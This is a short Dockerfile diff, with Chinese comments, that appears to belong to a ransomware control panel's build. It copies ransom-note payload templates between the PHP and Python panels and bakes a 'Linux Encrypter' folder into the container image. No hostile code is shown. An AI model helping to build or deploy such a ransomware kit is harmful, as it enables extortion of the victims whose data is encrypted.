@@ -6,6 +6,10 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 WORKDIR /app
 COPY ["Web Panel Python/", "/app/"]
 
+# 载荷模板以 PHP 侧为唯一数据源，构建时覆盖 Python 侧副本。
+# 曾因两份副本漂移，导致 v2.3.4 的勒索信修复只生效在 PHP 侧。
+COPY ["Web Panel/templates/", "/app/templates/payloads/"]
+
 # 解密工具烘焙到非卷路径；entrypoint 运行时补进 shared_payloads 卷
 COPY ["Linux Encrypter/", "/opt/jasmin-tools/"]
 
